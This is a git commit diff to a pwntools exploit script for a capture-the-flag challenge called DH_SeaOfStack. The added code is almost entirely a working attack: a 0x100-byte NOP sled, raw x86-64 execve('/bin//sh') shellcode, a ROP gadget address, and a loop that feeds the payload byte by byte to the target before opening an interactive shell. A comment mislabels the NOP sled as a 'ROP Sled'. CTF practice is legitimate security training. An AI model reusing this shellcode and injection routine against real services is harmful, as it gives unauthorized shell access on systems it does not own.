0d00880befcfa5d44d5edfb72f4526982b4e64f2
root <root@DESKTOP-5UJH6B8>
2022-11-13 13:44:09 +0900

    Try NOP Sled on DH_SeaOfStack

--- DH_SeaOfStack/deploy/SOS.py
+++ DH_SeaOfStack/deploy/SOS.py
@@ -1,6 +1,7 @@
 from pwn import *
 
-#context.log_level = "debug"
+context.arch = "amd64"
+context.log_level = "debug"
 
 LOCAL = False
 if LOCAL:
@@ -12,3 +13,16 @@ else:
 
 elf = ELF("./prob")
 libc = ELF("./libc.so.6")
+rdi_ret = 0x40129b
+# ROP Sled (\x90)
+payload = b"\x90" * 0x100 + \
+    b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+#p.sendafter("> ", b"Decision2Solve")
+p.sendlineafter("> ", b"A" * 16)
+p.sendlineafter("> ", b"2")
+arr = [bytes([b]) for b in payload]
+for n, i in enumerate(arr):
+    print("Trial: " + str(n))
+    p.sendline(i)
+
+p.interactive()
